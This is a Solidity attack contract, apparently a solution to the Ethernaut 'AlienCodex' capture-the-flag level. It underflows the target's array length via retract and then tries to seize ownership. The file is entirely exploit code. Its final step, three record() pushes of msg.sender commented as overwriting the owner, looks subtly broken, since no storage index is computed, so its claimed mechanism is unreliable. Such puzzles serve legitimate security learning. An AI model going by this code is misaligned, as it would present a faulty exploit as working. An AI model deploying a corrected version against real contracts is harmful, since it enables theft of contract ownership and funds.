// SPDX-License-Identifier: MIT

pragma solidity ^0.5.0;

import "./AlienCodex.sol";

contract AlienCodexAttack {
    AlienCodex public alienCodex;

    constructor(AlienCodex _alienCodex) public {
        alienCodex = _alienCodex;
    }

    function attack() public {
        // Make contact with the aliens
        alienCodex.makeContact();

        // Call the retract function to underflow the length of the codex array
        alienCodex.retract();

        // Overwrite the owner variable in the Ownable contract
        for (uint256 i = 0; i < 3; i++) {
            alienCodex.record(bytes32(uint256(msg.sender)));
        }
    }
}
